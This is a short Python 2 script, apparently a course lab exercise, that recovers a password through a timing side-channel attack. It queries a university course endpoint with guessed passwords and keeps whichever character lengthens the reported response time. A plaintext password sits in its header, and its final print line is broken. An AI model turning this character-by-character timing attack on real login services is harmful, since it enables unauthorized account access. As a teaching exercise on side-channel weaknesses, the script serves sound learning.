# -*- coding: utf-8 -*-
"""
Green Chinchilla
Harsh Nagarkar
Password Iequu0oo
"""

#importing all librarires
from __future__ import division
import urllib2
import random
from random import randint

#Creating Dictionary for iteration for alphabetical order and numbers
checkvalues = []
for i in range(97,123):
    checkvalues.append(str(chr(i)))
    checkvalues.append(str(chr(i-32)))
for i in range(0,10):
    checkvalues.append(str(i))
checkarray = checkvalues    
checkvalues = {el:0 for el in checkarray}

username = raw_input('Give me your username:- ')

#reading time function from the website to read response
def readtime(passw):
    contents = urllib2.urlopen("https://john.cs.olemiss.edu/~jones/csci343/pwd/index.php?username="+username+"&password="+str(passw)).read()
    contents = contents[:-3]
    return contents

#setting default password along with default time value
chs = 'aaaaaaaa'
mt = int(readtime(chs))

#list could also be used only reason I choose dictionary wasto make it go faster
#Hence initialising a empty dictionary for comparison
#creating a list to iterate random values from
#and setting the index of string char to be changed n = 0
checked = {}
values = checkvalues.keys()
n =  0

#initialsing looping 
while(len(checked)!=len(checkvalues)):
#random choice
    
    m = str(random.choice(values))
    
#removing check for same character
    if checkvalues[m]==0: 
        print "checking value for:- ",m
        
#for future setting the parameters for check
        checked[m] = 1
        checkvalues[m] = 1
        check = chs
#creating a temporary string to check
        check = list(check)
        check[n] = m
        check = "".join(check)
        predict = readtime(check)
#checking for if prediction is time
#and comparing it to max value to permanently choose character for that position
        try:
            predict = int(predict)
            if(predict>mt):
                chs = check
                mt = predict
                print chs
                n = n+1
#resetting all values
                checked ={}
                checkvalues = dict.fromkeys( checkvalues.iterkeys(), 0 )
        except:
#If reponse of website is string we have sucessfuly cracked coded
            print "It is a string"
            chs = check
            print chs
            print "The password cracked was".chs
            break
            


    